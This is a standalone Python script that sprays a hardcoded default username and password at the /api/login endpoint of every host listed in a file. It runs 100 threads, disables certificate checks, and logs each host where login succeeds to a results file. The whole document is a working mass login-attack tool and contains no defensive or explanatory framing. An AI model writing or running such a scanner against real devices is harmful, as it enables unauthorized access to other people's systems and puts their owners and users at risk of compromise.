#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import threading

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from queue import Queue
except Exception as e:
    import queue


def login(x):
    session = requests.session()
    url = '{}/api/login'.format(x)
    try:
        a = {'Username': user, 'Password': passwd}
        r = session.post(url, json=a, verify=False, timeout=10)
        if 'AuthSuccess' in str(r.text):
            save.write('{} {} {}\n'.format(x, user, passwd))
            save.flush()
        else:
            pass
    except Exception as e:
        pass


def worker():
    while True:
        ip = q.get()
        login(ip)
        q.task_done()


if __name__ == '__main__':
    moka = open('ips.txt', 'r')
    urls = moka.read().splitlines()
    user = 'admin'
    passwd = 'admin1234'
    save = open('results.txt', 'a')
    thr = int(100)
    try:
        q = Queue()
    except Exception as e:
        q = queue.Queue()

    for i in range(thr):
        t = threading.Thread(target=worker)
        t.daemon = True  # thread dies when main thread (only non-daemon thread) exits.
        t.start()
    for url in urls:
        q.put(url)

    q.join()

